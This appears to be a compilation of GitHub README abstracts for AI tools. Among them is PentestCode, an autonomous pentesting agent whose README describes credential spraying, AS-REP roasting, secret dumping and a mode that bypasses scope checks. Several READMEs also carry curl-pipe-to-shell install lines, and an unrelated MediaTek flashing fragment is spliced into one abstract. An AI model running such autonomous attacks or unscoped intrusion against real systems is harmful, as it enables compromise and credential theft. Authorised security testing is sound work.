title: google-research/paper-orchestra
abstract:
🎻 PaperOrchestra: A Multi-Agent Framework for Automated AI Research Paper Writing Yiwen Song 1 , Yale Song 1 , Tomas Pfister 1 , and Jinsung Yoon 1 1 Google Cloud AI Research PaperOrchestra is a multi-agent framework for automated AI research paper writing. It flexibly transforms unconstrained pre-writing materials (ideas and experimental logs) into submission-ready LaTeX manuscripts, including comprehensive literature synthesis and generated visuals, such as plots and conceptual diagrams. Acting like an orchestrated team of specialized agents, it handles outline generation, literature review, section writing, content refinement, and plotting to close the gap between raw research materials and submission ready papers. Key Features Multi-Agent Pipeline : Orchestrates specialized agents (Outline, Literature Review, Section Writing, Content Refinement, Plotting) for end-to-end paper generation. Comprehensive Literature Synthesis : Automatically searches, prioritizes, and integrates relevant literature into the manuscript. Visuals Generation : Generates plots and supports the inclusion of conceptual diagrams. LaTeX Automation : Produces submission-ready LaTeX manuscripts adhering to target conference templates. Installation Environment Setup : The project relies on a Conda environment named paper_orchestra . You can set up a similar environment with Python 3.11 and install the required dependencies. conda create -n paper_orchestra python=3.11
conda activate paper_orchestra
pip install -r requirements.txt Environment Variables : Create a .env file in the root of the project and add your API keys: # Add keys if you have them, otherwise leave them empty # You need to specify related keys if you want to use the model # For example, if you want to use Gemini models, you need to specify either VERTEX_AI_PROJECT and VERTEX_AI_LOCATION, or GEMINI_API_KEY # If you want to use OpenAI models, you need to specify OPENAI_API_KEY SEMANTIC_SCHOLAR_API_KEY = your_semantic_scholar_api_key OPENAI_API_KEY = your_openai_api_key VERTEX_AI_PROJECT = your_vertex_ai_project VERTEX_AI_LOCATION = your_vertex_ai_location GEMINI_API_KEY = your_gemini_api_key # if you want to run demo and send emails to yourself at the end, set these 2 fields as well SMTP_EMAIL = your_email SMTP_PASSWORD = your_password Dataset The dataset used for paper generation is not included in this code repository. It will be released separately at a later date.
Once available, you should download the dataset and place it under the datasets/ directory. Usage You can run the paper generation pipeline using the provided bash script or directly via the Python CLI. Using the Bash Script ./paper_writing_cli.sh Using the Python CLI directly python paper_writing_cli.py \
  --raw_materials_dir /path_to_your_raw_materials/ \
  --latex_template_dir /path_to_your_latex_template/ \
  --output_dir /path_to_your_output_folder/ \
  --use_plotting true Key Arguments --raw_materials_dir : (Required) Directory containing the raw materials (e.g., idea and experimental log). --latex_template_dir : (Required) Directory containing the LaTeX template (e.g., templates/cvpr2025 ). --output_dir : Directory to output the generated paper. If not specified, an automatic folder with a timestamp is created. --use_plotting : Enable the plotting agent workflow to generate figures from code (Default: False ). --writer_model_name : LLM for writer and literature agents. --reflection_model_name : LLM for reflection agents. Interactive Demo We provide an interactive Streamlit demo for the paper generation pipeline. For instructions on how to run and use it, please refer to the README.md in the frontend directory. Project Structure autoraters/ : Contains scripts for automated evaluation. methods/ : Core logic for agents and pipeline execution. templates/ : LaTeX templates for target conferences, you can add your own template by creating a new subfolder under this directory. utils/ : Utility functions for API calls, PDF handling, etc. Citation If you find this repo or our paper helpful, please cite it as follows: @article { song2026paperorchestra , title = { PaperOrchestra: A Multi-Agent Framework for Automated AI Research Paper Writing } , author = { Song, Yiwen and Song, Yale and Pfister, Tomas and Yoon, Jinsung } , journal = { arXiv preprint arXiv:2604.05018 } , year = { 2026 } } Disclaimer This is not an officially supported Google product.

title: isair/jarvis
abstract: Jarvis Your intelligence. Your hardware. A private, local-first AI assistant with voice and text chat. Talk naturally, as if Jarvis were a third person in the room. Voice-first · Local AI · Personal memory · No subscription Download Jarvis → · Website · Get started · Explore the app · Support the project An assistant that lives with you, not in the cloud Jarvis is built to be part of the conversation. Talk through an idea, discuss plans with a friend, then ask “Jarvis, what do you think?” While listening, it keeps a short, temporary rolling transcript of nearby speech so it can join an ongoing conversation using what was just discussed. Address Jarvis by name anywhere in a sentence and follow up naturally. Speech recognition, language models and speech synthesis run on hardware you control. Your diary and knowledge graph stay on your computer. Speech and chat models run locally when you use a local model server. Sensitive information is redacted before reaching model context or the saved diary. Web search, weather and connected tools use the network for those requests. A voice, a face, and a place in the conversation. Quick Install 1. Download the app. Choose your platform from GitHub Releases . Platform Package Open macOS · Apple Silicon Jarvis-macOS-arm64.zip Extract, move to Applications, then right-click → Open macOS · Intel Jarvis-macOS-x64.zip Extract, move to Applications, then right-click → Open Windows · x64 Jarvis-Windows-x64.zip Extract, then run Jarvis.exe Linux · x64 Jarvis-Linux-x64.tar.gz Extract, then run ./Jarvis/Jarvis 2. Choose your local models. The setup wizard guides you through speech recognition and a model server. Use Ollama , or connect an OpenAI-compatible server you already run, such as LM Studio, oMLX or llama.cpp. 3. Make it yours. Allow microphone access and let the first model downloads finish. When Jarvis reports that it is listening, try: “Jarvis, help me think through my day.” Right-click the face or use the tray menu to open Chat . Text replies are silent. Hardware and model choices Memory needs depend on model size, quantisation, context length and speech recognition. Both Ollama and OpenAI-compatible setup show a memory budget; you can edit estimates for models served through an OpenAI-compatible endpoint. Smaller models trade capability for lower resource use. Starting point Chat model Smaller hardware qwen3.5:0.8b Constrained memory gemma4:e2b Default gemma4:e4b Larger local setup qwen3.8:27b Budget memory for Whisper and, when different from chat, the fast model used for voice intent and tool routing. Apple Silicon uses unified memory; other GPUs use dedicated VRAM. Setup budgets chat and fast together alongside the selected Whisper model, using E2B for fast tasks when it fits or sharing E4B across both roles to save memory. Apple Silicon estimates reserve memory for macOS. Saved model choices are preserved, and insufficient memory shows CPU fallback guidance. For an experimental 27B alternative, see the Bonsai 2 local setup guide . What you can do A third person in the room. Bring Jarvis into an ongoing conversation with friends, talk through a problem aloud, or ask it to weigh in on a decision. “Jarvis, what do you think?” draws on the recent discussion, not just that one sentence. Remember beyond one session. Ask about past conversations, preferences and plans. Browse your local diary and knowledge graph in the Memory Viewer. Get things done. Built-in tools cover web search, weather, time, screenshot OCR, file access, optional search across your text and Markdown folders, nutrition tracking and optional location awareness. Connect your own tools. MCP servers add browser automation, smart-home controls and other integrations. Dictate into other apps. Hold a hotkey, speak, then release to paste locally transcribed text. See the platform limitations first. Type when you need to. The companion chat shares your voice conversation and memory. Text replies are silent, and you can rewind a sent message to regenerate from that point. Optional background work. Enable Background Tasks in Settings to queue work locally, follow results and cancel requests. Off by default. Bring Jarvis into the discussion You: We could have a picnic tomorrow. A friend: Depends on the weather. Should we plan something indoors instead? You: Jarvis, what do you think? Jarvis can use the recent conversation to understand that you are asking about the weather for the picnic, rather than treating the last sentence as an isolated question. This is the experience it is built around. Personalised requests can also draw on saved conversation history when no external tools are needed. How reliably it understands the context depends on speech recognition and your chosen model; see the evaluation results . Inside Jarvis Keep setup, activity and settings within reach. A guided start Choose the runtime that fits your machine. Setup walks through local models, speech and optional capabilities without requiring you to edit a configuration file. Progress you can actually follow The activity timeline keeps ordinary events readable. Downloads have a separate card with transferred bytes, percentage, speed and remaining time when the downloader provides them. Loading and warmup are distinct stages. Your setup, without the JSON Choose models, tune speech recognition, configure tools and enable Low Power Mode from Settings in the tray menu. A quiet companion to voice Open Chat for silent replies in the same conversation. Pause Voice Listening stops room transcription during meetings while chat and dictation stay available. Known limitations Jarvis is developed primarily on macOS. Windows and Linux behaviour may differ. See the evaluation results for tested capabilities. Accuracy and speed depend on your models and hardware. Smaller models can miss parts of complex requests, and slow speech recognition can drop utterances. Dictation is unavailable on macOS 26+ ( #172 ). Linux dictation requires X11, with limited Wayland support. Spoken “stop” can be mistaken for echo while Jarvis is speaking ( #24 ). No mobile app is available ( #17 ). Configuration Most people can use Settings from the tray. Advanced setups can edit ~/.config/jarvis/config.json . Open the configuration guide → The guide covers local model servers, speech recognition, Low Power Mode, voices, dictation, location, MCP integrations and troubleshooting. Dictation at a glance Platform Default hotkey Windows Ctrl + Win macOS, where supported Ctrl + Option Linux Ctrl + Alt Hold to record and release to paste. Double-tap for hands-free recording. Optional filler-word removal, a custom dictionary and dictation history are available in Settings. macOS needs Accessibility permission; Linux requires X11, with limited Wayland support. Bring your own tools Connect MCP servers for browser automation, Home Assistant, GitHub, databases and more. Credentials and network access depend on the tools you choose. Review a server's permissions before enabling it. Integration examples and server settings → Troubleshooting 🔇 Speech output unavailable: A voice-model or dependency failure disables speech output for the current run. Check the reason in Logs, correct the voice model settings or missing dependencies, then restart Jarvis. 🔊 Piper download interruptions: Connection resets and timeouts receive bounded retries. If they persist, check connectivity and restart Jarvis; completed voice files are retained. Certificate errors require correcting the trust configuration. 📥 Whisper download failures: Faster-whisper downloads run in a separate process with a five-minute limit. If a download crashes or times out, restart Jarvis to resume it; cached models stay available offline. 🎤 Whisper cache errors: Jarvis attempts one clean download recovery per startup. If it fails, check connectivity and free disk space, then follow the printed cache guidance and restart. Device fallbacks retain files downloaded during recovery.

title: ifixai-ai/iFixAi
abstract:
English · 簡體中文 · 日本語 · 한국어 Catch your agent's mistakes and blind spots before the shit hits the fan. Quick start • Test your agent • What you get back • Docs • Contributing How can you trust your AI agent? How do you know it will do its job the way it's supposed to, respecting your business as a whole: its intentions, its goals and who in the organization may do what? And how do you know it won't do something nobody asked for or authorized? That's why we built iFixAi, the independent auditor for agentic operational alignment and assurance. It puts your agent in a simulation of your business, sends it the requests a real day brings, including the ones that push it past its role, and a judge grades every reply. Every finding shows what was asked and what your agent did. The risk goes beyond cybersecurity, governance or compliance on their own, so iFixAi's inspections combine AI red teaming, governance, assurance and philosophy. Quick start See it work in a minute. No API key needed: it runs on a built-in demo agent with canned replies and canned grades, so you see the flow before you connect anything real. For a real audit, iFixAi picks a judge from a different provider than your agent. You need Python 3.10 or newer (a stock Mac's python3 is 3.9, so check python3 --version ). In a fresh virtualenv ( python3 -m venv .venv && source .venv/bin/activate ): pip install ifixai
ifixai author reference -o reference.yaml
ifixai validate reference.yaml
ifixai run --provider mock --eval-mode self --fixture reference.yaml This builds the simulation environment for an example agent, a support agent at a fictional fintech ( its profile ), checks it, and runs the 10 default inspections on the demo agent. The scorecard prints in your terminal and the reports land in ./ifixai-results/ . On Windows, run py -m venv .venv , then .venv\Scripts\activate . If ifixai isn't found, use python -m ifixai.cli.main . Test your own agent Any agent with a chat endpoint must be audited, and iFixAi can audit it. An OpenAI-compatible endpoint works as it is; anything else takes a few lines of Python . Any model can be the judge: OpenAI, Anthropic, Gemini, Azure, Bedrock, OpenRouter and more. iFixAi picks one from the keys you've set, never your agent's own provider. There are two ways to run it. With your coding agent (recommended) Install the plugin or the skill, then ask your coding agent to "run iFixAi on my agent" . It finds your agent, builds its simulation environment, shows the cost before anything is billed, runs the audit and explains what it found. Plugin (Claude Code and Codex) In Claude Code , run these, then ask, or type /ifixai:ifixai ( /reload-plugins if it doesn't show up): /plugin marketplace add ifixai-ai/iFixAi
/plugin install ifixai@ifixai-community Already installed? Run /plugin marketplace update ifixai-community , then /reload-plugins , to get the latest. Codex: run these in your terminal, then start Codex and ask. Moving from ifixai@ifixai-ai ? See plugin/README.md . codex plugin marketplace add ifixai-ai/iFixAi
codex plugin add ifixai@ifixai-community Skill (Cursor, VS Code, Windsurf, Zed and more) uvx ifixai install --agents cursor Then type /ifixai-skill in that agent. Swap cursor for claude , vscode , windsurf , cline , continue , gemini , zed or all . More in get started . With the guided CLI Describe your agent: copy the reference profile to my-agent.json and edit it ( how ). Or let the plugin or skill do it: your coding agent reads your agent's code and writes the profile for you. Build its simulation environment and check it. Install the extra for the judge you'll use: openai here, or anthropic , gemini and so on. pip install " ifixai[openai] " ifixai author my-agent.json -o my-agent.yaml
ifixai validate my-agent.yaml Set up the run with the wizard. It asks for your agent's endpoint, the judge and the suite, finds the judge's key and saves it all to ifixai.yaml . Then pass your agent's own token, see the plan before anything is billed, and run: ifixai setup export AGENT_API_KEY=... # your agent's own token ifixai run --fixture ./my-agent.yaml --api-key " $AGENT_API_KEY " --dry-run
ifixai run --fixture ./my-agent.yaml --api-key " $AGENT_API_KEY " --dry-run shows how many tests and judge calls the run makes, and any checks that don't apply to your agent and why, then stops. Prefer flags, for scripts or CI? The same run in one command. This example grades with an OpenAI key; for another judge, set that provider's key. export OPENAI_API_KEY=sk-... export AGENT_API_KEY=... # your agent's own token ifixai run --provider http --endpoint < agent-url > --api-key " $AGENT_API_KEY " --fixture ./my-agent.yaml --dry-run <agent-url> is your agent's base URL, up to /v1 . Use a staging copy, because the probes are real requests. No auth on it? Swap --api-key "$AGENT_API_KEY" for --auth-method none . What you get back A pass or fail for each inspection, with the evidence behind it. An A to F grade from five core pillars: fabrication, manipulation, deception, unpredictability and opacity. Three mandatory minimums (B01, B08 and P01). Failing any of them caps the grade at D. Reports in JSON and Markdown, so you can compare runs or gate CI with --min-score . More on scoring and every inspection . What a default run covers ifixai run runs these 10 inspections. They're quick, they all work over chat, and together they're enough for a grade. Add --full-run for all 61 inspections; any that can't apply to your agent are set aside first, and the run tells you why. Impact ID Checks that your agent… High B01 only lets a role use the tools it is allowed to use · mandatory minimum High B08 cannot be talked into more access than the user has · mandatory minimum High P01 never runs a destructive action for someone not allowed to · mandatory minimum High B12 resists prompt injection High B09 spots and blocks requests that break your policies High B27 does not hand one user's private data to another Medium B06 says when it is unsure instead of guessing with confidence Medium B16 reports a failure instead of pretending it worked Medium B18 sticks to the task it was given Medium B20 follows exact instructions on format, length, and content Other suites and options: CLI . Docs New here: Get started Doing something: Test your agent · Build a simulation environment Looking it up: CLI · Python API · Scoring · Inspections How it works: Methodology · Case studies Beyond live runs: Audit recorded actions · Policy Lab Contributing: CONTRIBUTING.md · good first issues . Questions: a GitHub issue or info@ime.life . Security: SECURITY.md . License: Apache 2.0 .

title: vstorm-co/agenticos
abstract: Open-source, self-hosted AI agent platform for your company's AI teammates. Build, run and govern agents on your own servers and models: shared chat, RAG, skills, a real browser, MCP, budgets, approvals and an audit trail. Apache-2.0 · built on Pydantic AI 🏆 Built by Vstorm — a recipient of the 2026 Open Agentic AI Innovation Award. Recognized by the Agentic AI Foundation for adopting AGENTS.md and integrating MCP in its open-source framework. Read the AAIF announcement · The work behind the award See it · Highlights · What is it? · Quick start · Server, desktop & mobile · Integrations · Product tour · Find your path · What ships · FAQ · Website · Introduction deck · Documentation English · Polski · Deutsch · Español Prepared conversation with fictional sales data in the real Visuals renderer. No live CRM or new model-generation run is represented. AgenticOS gives every team AI teammates: agents that work with files, run code, browse the web and use your company's tools and knowledge. Your colleagues and your agents work in the same live chat, and any agent can hand code to Claude Code or Codex, on the ChatGPT or Claude subscription you already pay for. It is open source (Apache-2.0) and self-hosted, a layer you run on your own infrastructure. Build and publish agents in the browser, share them with colleagues, and manage their access, cost and results in one place. New here? Click through the 17-slide introduction : the problem, the idea, the product on real screens, its controls and limits, and how to start. For every screen in detail, open the 47-slide product tour . Arrow keys step through either deck; O lists every slide. New in the latest releases Your local Claude Code or Codex, inside desktop chat. Choose a coding agent per conversation, work in an approved local folder, resume its session and apply corrections while it works. Sign in through the coding agent's own terminal flow. Your skills and project instructions. Opt a desktop conversation into local skills and AGENTS.md / CLAUDE.md , read from your computer. Each new chat starts with this sharing off. Discord joins Slack, Teams, Telegram and Mattermost. Answer mentions, direct messages and /ask ; review approvals and questions in the channel. Set up a channel . More useful Visuals and Apps. Draw country maps, pins and routes with the bundled AOWorldMap , or use the presentation skills to build a deck as an App. A command watcher can follow test or log output while an agent works. Release notes · Desktop guide ⚡ Highlights Your team and your agents, in one live room A project gives everyone the same files, instructions and a computer for the agents. Invite colleagues and work the way a team works: see who is here, watch a teammate's agent answer as it is written, and bring in any agent, tool or document with an @ . Reply to anyone, and the agent knows who said what Reply to a person or an agent's answer, and the agent applies the change and says whose it was. Every message carries a name, so a decision has an owner. Claude Code and Codex, on your team Any agent can hand software work to Claude Code or Codex. They build in the agent's own computer, on your ChatGPT or Claude subscription, and report what they changed, what they checked and what they need from you. Prepared interface example: Claude Code implements a supplier portal and Codex reviews it in read-only mode. Fictional handoffs; no coding CLI execution is represented. Ask how it works, get a drawing you can use An agent draws while it writes: a diagram from your documents, a calculator with sliders, a chart or a 3D scene, live under its message. One click saves it as an app your team opens by link. A prepared manufacturing Visual inside chat: a supply network, inbound delivery exceptions and assembly windows. Interactive fictional data; no ERP, machine connection or live model call is represented. Write to an agent and leave Ask for research that takes a while and close the tab. The agent keeps working, the answer lands in the conversation, and the bell tells you it is done. Your day, on one screen Open the console to what your agents did, the calls waiting on you and the conversations to pick up again - with a tour of what they can do that is easy to miss. Agents that work as a team A lead agent hands parts of a task to colleagues and writes up what they found - you see who it asked, and what each said. A real browser, right in the chat Watch it click through sites, take over when a sign-in needs you, point at a spot to comment. Build, equip and test in one window Enable tools and try a real task in the draft test panel before publishing the agent for colleagues. Apps, not just answers An agent publishes a dashboard or a report as a page with a stable link and versions. Northline: a prepared supply and production planning App with fictional shipments, local delay simulation and assembly windows. More prepared Apps: motor assembly and sales intelligence Working local demonstrations with fictional data. Motor Atlas lets you inspect a conceptual assembly and its component records; Revenue Pulse recalculates sales metrics by region and period. No equipment, ERP or CRM is connected. A website widget, on your own site The actual AgenticOS widget runs a published, read-only agent on the fictional Trail Supply website. In the recorded local test it answered using the seeded catalog in its instructions. Live inventory, purchases and payments are not connected. Build and publish a website widget 4,700+ MCP servers Connect Notion, GitHub, Jira or your own server, and choose which tools each agent may call. Work in AgenticOS from Claude Code, Codex or Cursor AgenticOS is an MCP server. Add it with one command and sign in through the browser: your coding assistant can list and run agents, read runs and what they cost, and search and fill knowledge bases, within what you allowed. 📸 See it in action Browse the current product gallery . Motor Atlas below is a prepared, interactive assembly explorer with fictional component records and telemetry; it is not a CAD drawing. 🧩 Build useful work around your agents Use Workflows to connect typed steps, agent calls and MCP tools on a visual canvas. Store structured results in Virtual Tables , start work with Routines , and review runs and approvals. Voice calls and the desktop app provide other ways to work with the same published agents. Visual workflows, from lead intake to a human-reviewed handoff. Illustrative 30-step draft with Google Workspace, Microsoft 365, HubSpot, Salesforce, Notion, Slack, agents and approvals. Connections are demo placeholders; this is not an executed integration. Structured work your agents and your team can read together. Virtual Tables with fictional companies, typed fields, stages and next actions. Switch between a grid and a kanban board. Start with a recognizable task: an LLM wiki in a Project , a website agent widget , or a team working from shared project files and instructions. A widget supplies the conversation surface; recommendations and cart actions still need your catalog, tool integration and permission checks. 💡 What is AgenticOS? AgenticOS is an open-source (Apache-2.0), self-hosted layer for building, sharing and governing AI agents across a company. Teams configure an agent in the browser by writing its instructions, choosing a model and switching on tools. They connect it to company documents and apps, and publish it to web chat, Slack, Teams, Discord, Mattermost, Telegram, a website widget or an API. Administrators control who can use each agent, what it may spend and which actions need a person's approval. Every run is recorded. Most agent frameworks give you a library, so every change to an agent's behaviour is a pull request, a review and a release. That is the wrong shape for the small agents a company actually wants, because the person who knows what the agent should say is not the person with commit access.

For linux, a patched kernel is only needed when using old kamakiri (see Setup folder) (except for read/write flash). Once the mtk script is running, boot into brom mode by powering off device, press and hold either
vol up + power or vol down + power and connect the phone. Once detected by the tool,

title: superdesigndev/treg
abstract:
Treg (OpenRouter for Tools) OpenRouter, but for agent tools instead of models. Point an agent at one base URL with one token
and it can do the job: a curated catalog of thousands of endpoints across many providers — SEO and backlinks,
social and trends, people and company enrichment, ads, scraping, image and video generation — priced per call, from a cent ,
with no provider signup. Plus your own team's keys, skills and CLIs, callable by every teammate's
agent without the credential ever leaving the server. Ask for the task, not the tool. You do not need to know which vendor sells backlink data, or to
hold an account with them. Search for what you want to do, read the price, call it. Built for the Superdesign team, live at treg.to — anyone can self-host. Why it exists The tools an agent needs for real work sit behind subscriptions nobody buys for a single run —
Semrush $139/mo, Moz $99/mo, Crunchbase $99/mo, Apollo $59/seat — behind signup walls, or behind no
public API at all (invite-only, partner-only, app-review-only). treg carries those accounts and
bills fractions of a cent per call. Two kinds of tool, one token The catalog — external endpoints treg can serve with its own key or through a verified public
route that needs no provider key. Own-key calls use the team's prepaid balance; anonymous calls
are free. No account with the provider is needed. New verified accounts receive $1.00 free once, when they create an eligible team. Your own tools — anything a teammate registered: a paid API account, an OAuth connection, a
vendor CLI, a SKILL.md . Your own key always wins over treg's, and those calls are never
metered. The vocabulary for the second half: tool = something the registry calls for you with the org's credential. Two kinds: endpoint — an upstream base_url + credential bindings (each binding injects one
secret into the request; a request can carry several, e.g. an OAuth bearer and a developer-token header). CLI — a vendor binary ( stripe , gh , vercel , ...) run with the credential injected. skill / bundle = a recipe ( SKILL.md ) + its secrets + its tool(s), registered together. The one rule: the proxy relays, never models the upstream, and injects auth server-side — so it survives upstream API changes and callers never hold keys. Part 1 · Using the registry Visit treg.to (hosted on Render) — the dashboard,
sign-in, and every URL below live there. Quickstart Same flow as the dashboard's Getting started guide: # 1. install the CLI — also points it at the registry curl -fsSL https://treg.to/install.sh | sh # 2. sign in (GitHub default · --email for a one-time code · --token for agents/CI) treg login # 3. do something useful immediately — no key, nothing registered treg catalog search " backlinks for a domain " # find a tool by what it DOES treg call tikhub.tiktok.user.profile --query uniqueId=tiktok
treg balance # exactly what that cost # (or `treg onboard` for the guided walkthrough) Fish Audio provides S2.1 Pro speech, public-voice discovery, and private voice cloning.
Speech is binary stdout, so redirect it to a file. A discovered voice's _id or a team voice id is
the TTS reference_id ; voices created on treg's Fish account are durable team resources: treg call fishaudio.tts.s2-1-pro --method POST --header model=s2.1-pro \
  --data ' {"text":"Hello from treg","format":"mp3"} ' > speech.mp3
treg call fishaudio.voices.discover --query self=false --query licensed=false --query language=en
treg resources list --provider fishaudio --kind voice With your own Fish key, requests remain an unrestricted, unmetered upstream relay and Fish owns the
account boundary. Catalog tool inputs are described by treg catalog get <id> . Tools marked strict_query reject undeclared or repeated query parameters, unsupported values and request bodies. Send each declared single-valued parameter once, and a row count such as limit as a whole number within its stated maximum: a tool that enforces this answers a 400 catalog_parameter_invalid naming the parameter, and nothing is charged. Your token identifies you on every call ( X-Treg-Token header) and is the same for all tools.
Discover what your team has shared: treg tool ls · check credential health: treg health . Or install it as a Claude Code plugin /plugin marketplace add superdesigndev/treg
/plugin install treg@treg Installs the treg skill and treg's tools with no token and no configuration. Run /mcp , pick
treg and sign in; the tools appear after it. Other agents: npx skills add superdesigndev/treg -s treg (or see Workflow skills for the rest).
See docs/CLAUDE-PLUGIN.md . MiniMax Code / MiniMax Agent users: the same
skill ships via the MiniMax Plugin Marketplace ( docs/MINIMAX-PLUGIN.md ). Workflow skills Ready-made recipes your agent runs end to end, every call through treg: Skill What your agent can do treg Find and call any tool in the catalog, plus your own tools web-access When your agent's own web tools fall short, read the live web without local scrapers: free search and page reads first, then the right platform job for social, stores, reviews, maps and papers, with treg falling back to the next vendor when one fails lead-signals Find in-market buyers from public signals (complaints, job changes, hiring, funding, tool adoption) and monitor a topic, competitor or account list for them ( treg.to/leads-signals ) recruit Turn a LinkedIn job post into a ranked shortlist: criteria from the post, people search, filters with reasons, one line on why each fits, cited evidence (posts, GitHub, talks, tenure, job change) under a per-candidate spend cap, then a checked personal email and phone, with a run file of counts, evidence and the vendor trail per candidate make-ugc Make AI UGC videos: trending hooks, a presenter, talking-head clips, captions ( treg.to/ugc ) jev-memory Give Claude Code a memory: a Claude Code mod where Jev judges each prompt after the turn and keeps your lasting preferences, installed ready-made or built from one prompt ( the mod ) install.sh installs only treg and names the others in one line; your agent offers them after
sign-in and the first call. Name the ones you want with sh -s -- --skills lead-signals,recruit (or --skills all ; the opt-in jev-memory and rea-growth are never in that set). In Claude Code each one is
also its own plugin in treg's marketplace: /plugin install recruit@treg , or pick them from /plugin . To add
them to an existing agent instead ( skills.sh CLI): npx skills add superdesigndev/treg # every public skill npx skills add superdesigndev/treg --skill lead-signals # just one treg skill bootstrap --skills all # the installer's set, with the treg CLI you already have The workflow skills run on treg, so set it up first (the Quickstart above, or point your agent at treg.to/llms.txt ). Claude.ai connector The Claude Connectors Directory surface is https://treg.to/mcp/v2/ . It exposes only curated
catalog endpoints, without image, video or audio generation, and separates read calls from write
calls so Claude receives accurate safety signals. The existing /mcp/ surface remains available for catalog endpoints, team-owned tools,
and imported skills. See the MCP and OAuth architecture for the boundary and implementation, and the submission runbook for release gates. Call a tool you don't have a key for The catalog is grouped by what endpoints do : keyword and rank tracking, backlinks and authority,
AI visibility, trending and discovery, publishing to socials, people and company enrichment, ads
management and creative, measurement. treg catalog # every platform, busiest first treg catalog search " find a work email " # by the job, not the vendor treg catalog search --new # tools added in the last 30 days, newest first treg catalog get hunter.people.email.find # params, PRICE, example response treg call hunter.people.email.find --query domain=reddit.

title: s0ld13rr/pentestcode
abstract:
PentestCode AI penetration testing agent in your terminal. Multi-agent architecture • Engagement state tracking • 20+ LLM providers PentestCode is an autonomous pentesting agent for your terminal. Point it at a target and it runs the tools, reads the output, updates its picture of the network, and decides what to do next — the way an operator would. A hard fork of OpenCode (MIT), stripped of the code-editing focus and rebuilt for offensive security. Beta — it holds up on real engagements and CTFs, but expect rough edges. File an issue when something breaks; that's what makes it better. What it does One instruction in, a full attack chain out: you: "pentest 10.10.10.5, goal is domain admin" Stage What the agent does Scan nmap -sS -p- finds 7 open ports and parses the XML straight into engagement state Recognize Ports 88 + 389 → Domain Controller. Fans out three enumerators in parallel (SMB, LDAP, HTTP) Enumerate Null SMB session → writable share. LDAP → user list. Gobuster → web dirs Attack AS-REP roast → crackable hash → first valid credential Spray That credential sprayed across SMB, WinRM, LDAP and RDP on every known host Exploit WinRM foothold → post-exploit agent dumps SAM / LSA / DPAPI Result Domain admin hash in hand — every step recorded with its evidence chain It's methodical where people get lazy: it sprays every credential against every service on every host, and it doesn't forget to check things. Everything it learns lands in a structured state you can query mid-run with /status , /vulns , or /creds . Install npm install -g pentestcode-ai # via curl curl -fsSL https://raw.githubusercontent.com/s0ld13rr/pentestcode/main/install.sh | bash A single self-contained binary — no Bun, Node, or runtime to install. Linux and macOS, x64 and arm64. Arch Linux (AUR): paru -S pentestcode-bin Other options Pin version: PENTESTCODE_VERSION=0.1.7 curl -fsSL https://raw.githubusercontent.com/s0ld13rr/pentestcode/main/install.sh | bash Custom directory: PENTESTCODE_INSTALL=/usr/local/bin curl -fsSL https://raw.githubusercontent.com/s0ld13rr/pentestcode/main/install.sh | bash From source: bun install
bun run build --single --skip-embed-web-ui # binary at packages/opencode/dist/pentestcode-<os>-<arch>/bin/pentestcode Quick start pentestcode auth login # connect your LLM provider pentestcode # interactive session pentestcode --prompt " scan 10.10.10.0/24 and enumerate all services " # one-shot Works with 20+ providers through ai-sdk — Anthropic, OpenAI, Google, Azure, AWS Bedrock, Ollama, and more. How it works Two things separate PentestCode from a pentester prompt pasted into a chat window: a team of agents and a memory they share . A team, not a monologue The design follows the strategist-coordinator model from HPTSA research — a 4.3× improvement over a single agent: ┌─────────────┐
                    │   pentest   │  strategist / coordinator
                    │   (lead)    │  plans, dispatches, tracks state
                    └──────┬──────┘
           ┌───────┬───────┼───────┬───────┐
           ▼       ▼       ▼       ▼       ▼
        ┌──────┐┌──────┐┌──────┐┌──────┐┌──────┐
        │recon ││scan- ││explo-││iden- ││post- │
        │      ││ner   ││iter  ││tity  ││explo │  ... + 7 more
        └──────┘└──────┘└──────┘└──────┘└──────┘ The lead agent ( pentest ) breaks the engagement into tasks and dispatches specialist subagents in parallel — each with its own system prompt, tool permissions, and domain knowledge. 13 agents in all: recon, scanner, enumerator, exploiter, identity (AD/Kerberos), infrastructure (SNMP/IPMI/databases), webapp (OWASP Top 10), post-exploit, exploit-dev, critic (false-positive checker), reporter, plus hidden agents for context compression and session management. A memory they all share When the scanner finds a port, the enumerator sees it instantly — because every agent reads from and writes to one structured engagement state : Hosts & services — IP, hostname, OS, ports, service versions, banners Vulnerabilities — severity, status (suspected / confirmed / exploited), evidence chain, confidence score Credentials — username, hash/password, type, domain, what they unlock Access — who holds shell/RDP/DB on which host, at what privilege level Relationships — an entity graph (EXPLOITED_VIA, CREDENTIAL_FROM, ADMIN_OF, PIVOT_TO, …) AD domain model — domain controllers, trusts, admins, password policy, GPOs Network segments — VLANs, reachable networks, pivot hosts Attack paths — cost-based Dijkstra + Yen's K-shortest routes through the relationship graph State survives the session: close the terminal, come back tomorrow, and the agent resumes where it stopped. Alongside it, a human-readable findings.md logs every vulnerability, credential, and access gain with timestamps — tail -f it to watch the engagement unfold. Tools 18 built-in pentest tools beyond bash. Parser tools are mandatory: after running nmap the agent must pipe the output through nmap_parse rather than grep the XML by hand, so every finding reaches the engagement state. Tool What it does nmap_parse Parse nmap XML → auto-populate hosts/services nuclei_parse Parse Nuclei JSON → create vulns with severity cme_parse Parse NetExec output → update creds/access/hosts gobuster_parse Parse dir brute output → classify findings bloodhound_parse Parse SharpHound JSON → populate AD model sqlmap_parse Parse sqlmap output → extract injection points xss_detect Analyze responses for reflected/stored XSS jwt_analyze Decode JWT, check alg:none/weak HMAC/expiry cred_spray Plan credential spray across all discovered services scope_check CIDR/wildcard scope validation attack_path_suggest Cost-based path finding through the relationship graph tunnel_manage Plan SSH/chisel/ligolo tunnels, track live sessions phase_control Phase management with quality gates report_gen Generate markdown/JSON pentest reports state_update Record findings (30+ mutation types, batch mode) state_query Query engagement state (20+ query types) Skills 19 curated knowledge packs, loaded on demand so they cost context only when relevant: Phase checklists (6) — what to do in each pentest phase Service knowledge (9) — SMB, SSH, FTP, DNS, databases, web servers, mail, Docker/K8s, CI/CD Playbooks (4) — infrastructure, Active Directory, web application, cloud Skills are plain markdown. Add your own by dropping a SKILL.md into the skills directory — no code changes needed. Commands & modes Drive a live session with slash commands: Command What it does /status Engagement dashboard — hosts, vulns, creds, phase /targets Host & service table /vulns Findings by severity /creds Discovered credentials /scope View/edit target scope /phase Phase management /mode Switch auto / free / guided /pause Pause on findings (never / always / checkpoint) /report Generate a pentest report And set how much rope the agent gets: auto — runs through the pentest phases autonomously, spawning subagents as needed free — no phase structure; responds to your requests directly (bypasses scope checks) guided — step by step; proposes each action and waits for approval Modes combine with pause behavior — auto + pause always gives you autonomous execution that stops at every finding for review. Use cases One toolkit across offensive security: Penetration testing — 